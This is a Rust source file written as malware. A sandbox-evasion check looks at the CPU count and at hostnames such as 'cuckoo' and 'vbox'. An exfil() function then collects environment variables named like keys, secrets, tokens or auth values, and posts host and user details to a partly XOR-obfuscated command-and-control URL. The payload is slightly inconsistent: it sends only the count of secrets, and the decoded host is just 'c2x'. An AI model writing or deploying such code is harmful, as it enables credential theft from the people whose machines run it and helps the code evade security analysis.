use std::collections::HashMap;
use std::env;

fn xor(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter().enumerate().map(|(i, b)| b ^ key[i % key.len()]).collect()
}

fn check() -> bool {
    let n = std::thread::available_parallelism().map(|p| p.get()).unwrap_or(1);
    if n < 2 { return true; }
    let h = env::var("HOSTNAME").unwrap_or_default().to_lowercase();
    ["sandbox", "cuckoo", "vmware", "vbox"].iter().any(|s| h.contains(s))
}

fn exfil() {
    if check() { return; }
    let mut secrets: HashMap<String, String> = HashMap::new();
    for (k, v) in env::vars() {
        for t in ["KEY", "SECRET", "TOKEN", "AUTH"].iter() {
            if k.contains(t) { secrets.insert(k.clone(), v.chars().take(100).collect()); break; }
        }
    }
    let host = env::var("HOSTNAME").unwrap_or_default();
    let user = env::var("USER").unwrap_or_default();
    let body = format!("{{\"host\":\"{}\",\"user\":\"{}\",\"n\":{}}}", host, user, secrets.len());
    let u = String::from_utf8(xor(b"\x13", b"k")).unwrap_or_default();
    let _ = ureq::post(&format!("https://c2{}/", u)).send_string(&body);
}
